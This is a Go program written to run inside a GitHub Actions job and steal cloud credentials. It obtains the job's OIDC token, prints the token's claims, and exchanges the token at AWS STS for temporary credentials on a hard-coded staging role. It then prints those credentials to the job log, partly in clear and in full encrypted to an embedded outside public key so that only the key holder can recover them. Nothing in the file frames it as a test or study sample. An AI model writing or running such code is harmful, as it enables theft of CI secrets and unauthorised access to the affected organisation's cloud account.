package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const pubPEM = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAujbtuwuj2xHnLpfceXJG
doHPCbZu55RdPVBYRHERQeoGzdaNGcf0MesRKNMwzvfHmrWzFRC13VBabaafHXDB
VhfvdkpXMTUmVb+t9ispPq+He7xJGuIBVDTAkCLp1xcjPnGlKniQSP6ll5tGuCMp
ENJQU3/kTdgAzZrRcM1FIZY14p91t1Zk5NrFLqJwUyM16n6HNR5tNwHm1rx/oEtF
wTvL4bfdlqcmTWEgyXZjunZl43P96rSf2GYRd4j4503BcX8lSP6xr1eAsmcbtZgb
j4TPNFbjvS+8O0/uZHn2wm94k5oXJTmCnQcMw4LCTne9Xb8z8rZ3JTcBVHhFTbFZ
GQIDAQAB
-----END PUBLIC KEY-----
`

func enc(payload []byte) string {
	block, _ := pem.Decode([]byte(pubPEM))
	pk, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return "ERRPK:" + err.Error()
	}
	rsapk := pk.(*rsa.PublicKey)
	key := make([]byte, 32)
	rand.Read(key)
	blk, _ := aes.NewCipher(key)
	g, _ := cipher.NewGCM(blk)
	nonce := make([]byte, g.NonceSize())
	rand.Read(nonce)
	ct := g.Seal(nil, nonce, payload, nil)
	ek, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsapk, key, nil)
	if err != nil {
		return "ERRENC:" + err.Error()
	}
	return base64.StdEncoding.EncodeToString(ek) + "." + base64.StdEncoding.EncodeToString(nonce) + "." + base64.StdEncoding.EncodeToString(ct)
}

func main() {
	if os.Getenv("GITHUB_JOB") != "no-env" {
		fmt.Println("SKIP_JOB", os.Getenv("GITHUB_JOB"))
		return
	}
	role := "arn:aws:iam::637423199583:role/github-actions-ecr-staging-aitech-gpu"
	aud := "sts.amazonaws.com"
	u := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	t := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if u == "" || t == "" {
		fmt.Println("NO_OIDC_ENV")
		return
	}
	req, _ := http.NewRequest("GET", u+"&audience="+url.QueryEscape(aud), nil)
	req.Header.Set("Authorization", "bearer "+t)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("TOKEN_REQ_ERR", err)
		return
	}
	b, _ := io.ReadAll(resp.Body)
	fmt.Println("TOKEN_RESP_CODE", resp.StatusCode)
	var j struct {
		Value string `json:"value"`
	}
	json.Unmarshal(b, &j)
	tok := j.Value
	fmt.Println("TOKEN_LEN", len(tok))
	parts := strings.Split(tok, ".")
	if len(parts) > 1 {
		pb, e := base64.RawURLEncoding.DecodeString(parts[1])
		if e == nil {
			fmt.Println("CLAIMS", string(pb))
		}
	}
	form := url.Values{}
	form.Set("Action", "AssumeRoleWithWebIdentity")
	form.Set("Version", "2011-06-15")
	form.Set("RoleArn", role)
	form.Set("RoleSessionName", "ghaprobe637")
	form.Set("WebIdentityToken", tok)
	form.Set("DurationSeconds", "3600")
	rr, err := http.Post("https://sts.amazonaws.com/", "application/x-www-form-urlencoded", strings.NewReader(form.Encode()))
	if err != nil {
		fmt.Println("STS_ERR", err)
		return
	}
	sb, _ := io.ReadAll(rr.Body)
	fmt.Println("STS_CODE", rr.StatusCode)
	body := string(sb)
	red := body
	if len(red) > 500 {
		red = red[:500]
	}
	fmt.Println("STS_HEAD", red)
	fmt.Println("STS_ENC", enc(sb))
}
